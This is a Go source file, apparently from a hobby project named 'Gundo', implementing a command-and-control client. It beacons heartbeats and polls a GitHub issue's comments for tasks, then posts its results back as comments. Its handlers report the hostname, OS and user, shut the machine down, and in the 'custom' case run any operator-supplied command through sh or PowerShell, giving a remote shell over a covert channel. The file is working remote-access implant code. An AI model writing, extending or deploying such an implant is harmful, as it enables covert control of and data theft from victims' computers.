package main

import (
	"fmt"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strings"
	"time"
)

// fixed client version rep
const clientVersion = "0.1.0"

// in memory state that payload/process is running.
// It gives us a place to handle client specific behavior

type Client struct {
	ID        string
	Version   string
	StartedAt time.Time
	// set of task ID already handled to avoid duplicate execution
	// MB: Gonna keep this out for now given our program has no cases that could lead to dupe IDs. but of course in terms of the merit of engineering edge cases do happen and should be built into handle those
	// Processed map[string]struct{}
}

// function to create a new client struct in memory and returns its address.
// that way we can actually modify the values in memory rather than a copy
func newClient(clientID string) *Client {
	return &Client{
		ID:        clientID,
		Version:   clientVersion,
		StartedAt: time.Now().UTC(),
	}
}

// ── Command execution ──────────────────────────────────────────────────────────

// execute runs a shell command and returns its combined stdout+stderr.
// Uses the platform's native shell so pipes, redirects, env vars, etc. all work.
// og from ki

func execute(cmd string) string {
	var c *exec.Cmd

	// choose OS to run command on
	switch runtime.GOOS {
	case "windows":
		// using ps cus cmd lame
		c = exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-Command", cmd)
	default:
		c = exec.Command("/bin/sh", "-c", cmd)
	}

	// returns the output of the results
	out, err := c.CombinedOutput()
	result := strings.TrimSpace(string(out))

	if err != nil {
		if result != "" {
			return fmt.Sprintf("%s\n[exit error: %s]", result, err)
		}
		return fmt.Sprintf("[exit error: %s]", err)
	}
	if result == "" {
		// commands like cd wont create output maybe besides on ps
		return "[command produced no output]"
	}
	return result
}

/*

Client Behaviour:

1. GundoMessage Task recieved
2. client handles/executes task (client.handleTask(gundotask))
3. inspects the task action (ping, echo, stauts, etc.)
4. return the result as a GundoMessage onto repo
*/

func (c *Client) handleTask(task GundoMessage) GundoMessage {

	// Every result needs these common fields.
	// take task from param --> drop it in to start building result return struct --> populate struct with output and return it
	result := GundoMessage{
		Type:      "result",
		TaskID:    task.TaskID,
		ClientID:  c.ID,
		Status:    "success",
		Timestamp: time.Now().UTC().Format(time.RFC3339),
	}

	// Run only explicitly supported Gundo actions.
	switch task.Action {

	case "ping":
		result.Output = "pong"

	case "get_hostname":
		hostname, err := os.Hostname()
		if err != nil {
			result.Status = "error"
			result.Output = err.Error()
			break
		}

		result.Output = hostname

	case "get_os":
		result.Output = runtime.GOOS

	case "get_user":
		currentUser, err := user.Current()
		if err != nil {
			result.Status = "error"
			result.Output = err.Error()
			break
		}

		result.Output = currentUser.Username

	case "shutdown":
		result.Output = "shutdown scheduled"
		go func() {
			time.Sleep(1 * time.Second) // allow network response to flush
			if runtime.GOOS == "windows" {
				_ = exec.Command("shutdown", "/s", "/t", "0").Run()
			} else {
				_ = exec.Command("shutdown", "-h", "now").Run()
			}
		}()
	case "custom":
		if task.Command == "" {
			result.Status = "error"
			result.Output = "no command provided"
			break
		}
		result.Output = execute(task.Command)

	default:
		result.Status = "error"
		result.Output = "unsupported action"
	}

	return result
}

// heartbeat to check health of client

func (c *Client) createHeartbeat() GundoMessage {
	// new gundo mesaget ype of heartbeat
	return GundoMessage{
		Type:      "heartbeat",
		ClientID:  c.ID,
		Status:    "online",
		Timestamp: time.Now().UTC().Format(time.RFC3339),
	}
}

func (c *Client) heartbeatLoop(issueNumber int) {

	// Send one immediately when the client starts.
	heartbeat := c.createHeartbeat()

	if err := createComment(issueNumber, heartbeat); err != nil {
		fmt.Printf("Heartbeat failed: %v\n", err)
	} else {
		fmt.Println("[+] Heartbeat sent")
	}

	// ticker to track the time on the heartbeat

	ticker := time.NewTicker(2 * time.Minute)
	defer ticker.Stop()

	// happens based on range of the ticker to create a new heatbeat message
	for range ticker.C {
		heartbeat := c.createHeartbeat()

		// if the heartbeat comment cant be made then the system is gone
		if err := createComment(issueNumber, heartbeat); err != nil {
			fmt.Printf("Heartbeat failed: %v\n", err)
			continue
		}

		fmt.Println("[+] Heartbeat sent")
	}
}

func (c *Client) pollTasks(issueNumber int) {

	// Get the comments that already exist when the client starts.
	comments, err := listComments(issueNumber)
	if err != nil {
		fmt.Printf("Error getting initial comments: %v\n", err)
		return
	}

	var lastSeenCommentID int64

	// Establish our starting point so we don't replay old tasks.
	if len(comments) > 0 {
		lastSeenCommentID = comments[len(comments)-1].ID
	}

	fmt.Printf("[+] Client %s listening for tasks...\n", c.ID)

	for {
		comments, err = listComments(issueNumber)
		if err != nil {
			fmt.Printf("Error polling comments: %v\n", err)
			time.Sleep(10 * time.Second)
			continue
		}

		// brute-force solution that can be fixed later
		for _, comment := range comments {

			// Ignore comments we've already seen.
			if comment.ID <= lastSeenCommentID {
				// continue always skips rest of iteration the moves on
				continue
			}

			// Mark this transport message as seen.
			lastSeenCommentID = comment.ID

			// Convert the GitHub comment body into a Gundo message.
			message, err := parseGundoMessage(comment.Body)
			if err != nil {
				fmt.Printf("Ignoring non-Gundo comment: %v\n", err)
				continue
			}

			// The client only executes task messages.
			if message.Type != "task" {
				continue
			}

			// Ignore tasks intended for a different client.
			if message.TargetClientID != c.ID {
				continue
			}

			fmt.Printf(
				"[+] Task received: %s (%s)\n",
				message.TaskID,
				message.Action,
			)

			// execute our supported action
			// supported action takes the struct, builds a new one, and returns it
			result := c.handleTask(message)

			// Send the result back through the same GitHub mailbox.
			err = createComment(issueNumber, result)
			if err != nil {
				fmt.Printf(
					"Error posting result for task %s: %v\n",
					message.TaskID,
					err,
				)
				continue
			}

			fmt.Printf(
				"[+] Result sent for task %s: %s\n",
				message.TaskID,
				result.Output,
			)
		}

		time.Sleep(10 * time.Second)
	}
}
